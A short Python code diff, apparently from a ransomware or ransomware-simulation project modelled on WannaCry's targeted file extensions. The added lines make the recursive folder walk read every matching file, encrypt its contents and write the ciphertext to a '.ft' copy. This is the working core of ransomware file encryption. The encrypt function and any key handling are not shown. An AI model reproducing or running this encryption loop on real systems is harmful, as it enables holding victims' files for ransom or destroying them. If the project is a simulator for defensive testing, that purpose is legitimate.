@@ -26,7 +26,7 @@ def read_wannacry_extensions():
     
 def recursive_walk(folderpath):
     global counter
-    for root, dirs, files in os.walk(folderpath, topdown=True):
+    for root, dirs, files in os.walk(folderpath, topdown=True,):   # By default does not follows simbolic links to subdirectories
         # first treat files in folders
 
         for file in files:
@@ -40,9 +40,11 @@ def recursive_walk(folderpath):
                     fileout = file + ".ft"
             
 
-                with open(os.path.join(root, file), 'rb') as infile: 
+                with open(os.path.join(root, file), 'rb') as infile:
+                    incontent = infile.read()
+                    ciperedcontent = encrypt(incontent)
                     with open(os.path.join(root, fileout), 'wb') as outfile:
-                        pass
+                        outfile.write(ciperedcontent)
                 #try:
 
                 #if os.access(os.path.join(root, file), os.R_OK):
